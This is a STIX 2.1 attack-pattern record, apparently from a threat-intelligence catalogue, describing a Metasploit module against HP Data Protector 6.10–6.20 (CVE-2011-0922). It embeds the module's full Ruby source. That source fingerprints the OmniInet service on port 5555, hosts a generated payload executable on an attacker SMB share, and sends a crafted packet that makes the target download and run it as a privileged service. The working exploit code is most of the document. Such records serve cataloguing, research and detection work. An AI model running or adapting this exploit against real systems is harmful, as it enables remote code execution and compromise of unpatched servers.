{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c67f158a-b82d-4c41-b119-0ddc0d097d96",
    "created": "2024-08-14T16:45:42.142858Z",
    "modified": "2024-08-14T16:45:42.142862Z",
    "name": "HP Data Protector 6.10/6.11/6.20 Install Service",
    "description": " This module exploits HP Data Protector OmniInet process on Windows only. This exploit invokes the install service function which allows an attacker to create a custom payload in the format of an executable.  To ensure this works, the SMB server created in MSF must have a share called Omniback which has a subfolder i386, i.e. \\\\\\\\192.168.1.1\\\\Omniback\\\\i386\\\\ ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_install_service.rb",
            "external_id": "hp_dataprotector_install_service.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0922"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector 6.10/6.11/6.20 Install Service',\n      'Description'    => %q{\n        This module exploits HP Data Protector OmniInet process on Windows only.\n        This exploit invokes the install service function which allows an attacker to create a\n        custom payload in the format of an executable.\n\n        To ensure this works, the SMB server created in MSF must have a share called Omniback\n        which has a subfolder i386, i.e. \\\\\\\\192.168.1.1\\\\Omniback\\\\i386\\\\\n      },\n      'Author'         => [\n        'Ben Turner',\n      ],\n      'References'     =>\n        [\n          ['CVE', '2011-0922'],\n          ['URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          [ 'HP Data Protector 6.10/6.11/6.20 / Windows', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-11-02'))\n\n      register_options(\n        [\n          Opt::RPORT(5555),\n          OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 15])\n        ])\n\n      deregister_options('FOLDER_NAME')\n      deregister_options('SHARE')\n      deregister_options('FILE_NAME')\n  end\n\n  def peer\n    \"#{rhost}:#{rport}\"\n  end\n\n  def check\n    fingerprint = get_fingerprint\n\n    if fingerprint.nil?\n      vprint_status('Unable to fingerprint because no response.')\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"#{peer} - #{fingerprint}\")\n\n    if fingerprint =~ /HP Data Protector A\\.06\\.(\\d+)/i\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Detected\n  end\n\n  def get_fingerprint\n    ommni = connect\n    ommni.put(rand_text_alpha_upper(64))\n    resp = ommni.get_once(-1)\n    disconnect\n\n    return nil if resp.nil?\n\n    # Delete unicode last null\n    Rex::Text.to_ascii(resp).chop.chomp\n  end\n\n  def setup\n    super\n\n    self.file_contents = generate_payload_exe\n    self.file_name = \"i386\\\\installservice.exe\"\n    self.share = \"Omniback\"\n  end\n\n  def primer\n    print_status(\"File available on #{unc}...\")\n    vprint_status(\"#{peer} - Trying to execute remote EXE...\")\n\n    lhost = \"#{datastore['SRVHOST']}\"\n    lhostfull = \"\"\n    lhost.each_char do |character|\n      lhostfull = lhostfull << \"\\x00\" << character\n    end\n\n    packet = \"\\x00\\x00\\x01\\xbe\\xff\\xfe\\x32\\x00\\x00\\x00\\x20\"\n    packet << lhostfull\n    packet << \"\\x00\\x00\\x00\\x20\\x00\\x30\\x00\"\n    packet << \"\\x00\\x00\\x20\\x00\\x53\\x00\\x59\\x00\\x53\\x00\\x54\\x00\\x45\\x00\\x4d\\x00\"\n    packet << \"\\x00\\x00\\x20\\x00\\x4e\\x00\\x54\\x00\\x20\\x00\\x41\\x00\\x55\\x00\\x54\\x00\"\n    packet << \"\\x48\\x00\\x4f\\x00\\x52\\x00\\x49\\x00\\x54\\x00\\x59\\x00\\x00\\x00\\x20\\x00\"\n    packet << \"\\x43\\x00\\x00\\x00\\x20\\x00\\x32\\x00\\x36\\x00\\x00\\x00\\x20\\x00\\x5c\\x00\"\n    packet << \"\\x5c\"\n    packet << lhostfull\n    packet << \"\\x00\\x5c\\x00\\x4f\\x00\\x6d\\x00\\x6e\\x00\\x69\\x00\\x62\\x00\"\n    packet << \"\\x61\\x00\\x63\\x00\\x6b\\x00\\x5c\\x00\\x69\\x00\\x33\\x00\\x38\\x00\\x36\\x00\"\n    packet << \"\\x5c\\x00\\x69\\x00\\x6e\\x00\\x73\\x00\\x74\\x00\\x61\\x00\\x6c\\x00\\x6c\\x00\"\n    packet << \"\\x73\\x00\\x65\\x00\\x72\\x00\\x76\\x00\\x69\\x00\\x63\\x00\\x65\\x00\\x2e\\x00\"\n    packet << \"\\x65\\x00\\x78\\x00\\x65\\x00\\x20\\x00\\x2d\\x00\\x73\\x00\\x6f\\x00\\x75\\x00\"\n    packet << \"\\x72\\x00\\x63\\x00\\x65\\x00\\x20\\x4f\\x00\\x6d\\x00\\x6e\\x00\\x69\\x00\\x62\"\n    packet << \"\\x00\\x61\\x00\\x63\\x00\\x6b\\x00\\x20\\x00\\x5c\\x00\\x5c\"\n    packet << lhostfull\n    packet << \"\\x5c\\x00\\x5c\\x00\\x4f\\x00\"\n    packet << \"\\x6d\\x00\\x6e\\x00\\x69\\x00\\x62\\x00\\x61\\x00\\x63\\x00\\x6b\\x00\\x5c\\x00\"\n    packet << \"\\x69\\x00\\x33\\x00\\x38\\x00\\x36\\x00\\x5c\\x00\\x69\\x00\\x6e\\x00\\x73\\x00\"\n    packet << \"\\x74\\x00\\x61\\x00\\x6c\\x00\\x6c\\x00\\x73\\x00\\x65\\x00\\x72\\x00\\x76\\x00\"\n    packet << \"\\x69\\x00\\x63\\x00\\x65\\x00\\x2e\\x00\\x65\\x00\\x78\\x00\\x65\\x00\\x20\\x00\"\n    packet << \"\\x2d\\x00\\x73\\x00\\x6f\\x00\\x75\\x00\\x72\\x00\\x63\\x00\\x65\\x00\\x20\\x00\"\n    packet << \"\\x5c\\x00\\x5c\"\n    packet << lhostfull\n    packet << \"\\x00\\x5c\\x00\\x4f\\x00\\x6d\\x00\\x6e\\x00\\x69\\x00\\x62\\x00\\x61\\x00\\x63\"\n    packet << \"\\x00\\x6b\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x54\"\n    packet << \"\\xff\\xfe\\x32\\x00\\x36\\x00\\x00\\x00\\x20\\x00\\x5b\\x00\\x30\\x00\\x5d\\x00\"\n    packet << \"\\x41\\x00\\x44\\x00\\x44\\x00\\x2f\\x00\\x55\\x00\\x50\\x00\\x47\\x00\\x52\\x00\"\n    packet << \"\\x41\\x00\\x44\\x00\\x45\\x00\\x0a\\x00\\x5c\\x00\\x5c\"\n    packet << lhostfull\n    packet << \"\\x00\\x5c\\x00\\x4f\\x00\\x6d\\x00\\x6e\\x00\\x69\\x00\\x62\\x00\\x61\\x00\\x63\"\n    packet << \"\\x00\\x6b\\x00\\x5c\\x00\\x69\\x00\\x33\\x00\\x38\\x00\\x36\\x00\"\n\n    connect\n    sock.put(packet)\n    disconnect\n  end\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['SMB_DELAY']) {super}\n    rescue Timeout::Error\n      # Stop SMB Server\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-02",
    "x_mitre_platforms": [
        "win'"
    ]
}